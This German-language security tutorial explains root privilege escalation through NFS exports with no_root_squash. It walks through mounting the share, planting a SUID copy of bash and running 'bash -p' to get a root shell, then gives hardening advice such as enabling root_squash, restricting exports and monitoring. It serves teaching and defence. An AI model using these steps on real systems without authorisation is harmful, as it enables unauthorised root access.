# NFS (Network File System)

**Ziel**: Missbrauch falsch konfigurierter NFS-Freigaben zur lokalen Privilegieneskalation bis hin zur Root-Shell über SUID-Binaries.

### **Einleitung**

Das Network File System (NFS) erlaubt die Freigabe von Dateisystemen über das Netzwerk. Bei unsicherer Konfiguration – insbesondere wenn `root_squash` deaktiviert ist oder Schreibrechte auf sensible Verzeichnisse bestehen – kann ein Angreifer Root-Rechte auf dem Zielsystem erlangen.

Die Option `root_squash` sorgt normalerweise dafür, dass Root-Anfragen auf dem Client als anonymer Benutzer (`nfsnobody`) behandelt werden. Ist diese Option jedoch deaktiviert, können Root-Operationen direkt auf dem NFS-Server ausgeführt werden – ein schwerwiegender Sicherheitsfehler.

***

### **Ablauf eines typischen NFS-Angriffs**

#### **1. Erkennung zugänglicher NFS-Freigaben**

Der Angreifer identifiziert exportierte Dateisysteme des Servers mit:

```bash
showmount -e <nfs-server-ip>
```

Beispielausgabe:

```
Export list for 192.168.1.100:
/export *(rw,sync,no_root_squash)
```

**Achtung**: `no_root_squash` weist auf eine potenziell ausnutzbare Konfiguration hin.

***

#### **2. Mounten der NFS-Freigabe**

Der Angreifer mountet die Freigabe lokal:

```bash
sudo mount -t nfs <nfs-server-ip>:/export /mnt/nfs
cd /mnt/nfs
```

***

#### **3. Vorbereitung einer SUID-fähigen Binary**

Um später Root-Rechte zu erlangen, kopiert der Angreifer eine eigene Bash-Binary auf die gemountete Freigabe:

```bash
cp /bin/bash ./bash
```

> Alternativ: Kompilierung einer kleinen C-Shell mit Root-UID oder Verwendung einer vorbereiteten Payload-Binary.

***

#### **4. Setzen des SUID-Bits (wenn `no_root_squash` aktiv)**

Wird der NFS-Export ohne `root_squash` bereitgestellt, kann der Angreifer lokal als Root auf die Freigabe zugreifen und eine Datei mit Root-Rechten und gesetztem SUID-Bit ablegen:

```bash
chmod +s bash
```

Ergebnis:

```bash
ls -l bash
-rwsr-xr-x 1 root root 1168776 Jun  3 10:42 bash
```

***

#### **5. Login auf dem Zielsystem**

Der Angreifer loggt sich mit einem Benutzerkonto (z. B. über SSH) auf dem NFS-Server ein:

```bash
ssh user@<nfs-server-ip>
```

***

#### **6. Ausführen der SUID-Bash zur Erlangung einer Root-Shell**

Die zuvor platzierte Binary kann auf dem Server ausgeführt werden:

```bash
/mnt/nfs/bash -p
```

Option `-p`: Bewahrt effektive Benutzerrechte (inkl. Root) bei SUID-Ausführung.

Ergebnis: Root-Shell auf dem System.

***

### **Sicherheitsbewertung & Empfehlungen**

| Risiko         | Hoch (Privilegieneskalation bis Root)              |
| -------------- | -------------------------------------------------- |
| Angriffsvektor | Lokales oder netzwerkweites Mounten                |
| Voraussetzung  | Schreibzugriff auf NFS-Export mit `no_root_squash` |

#### **Empfohlene Schutzmaßnahmen**

*   **Immer `root_squash` aktivieren**:\
    In `/etc/exports`:

    ```
    /export *(rw,sync,root_squash)
    ```
*   **Exporte restriktiv konfigurieren**: Nur bestimmten IPs erlauben:

    ```
    /export 192.168.1.0/24(rw,sync,root_squash)
    ```
* **Dateisystemberechtigungen korrekt setzen** (keine SUID-Binaries auf NFS)
* **Firewall-Regeln** zum Schutz vor unautorisierten Mount-Anfragen
* **Monitoring & Logging** aktivieren (z. B. durch `auditd`)

***

### **Zusätzliche Hinweise**

* `no_root_squash` wird teils aus Bequemlichkeit in Testumgebungen verwendet – sollte in Produktivumgebungen _strikt_ vermieden werden.
* Ein solcher Angriff ist besonders kritisch in Multi-Tenant-Systemen und Cloud-Umgebungen mit geteiltem Storage.
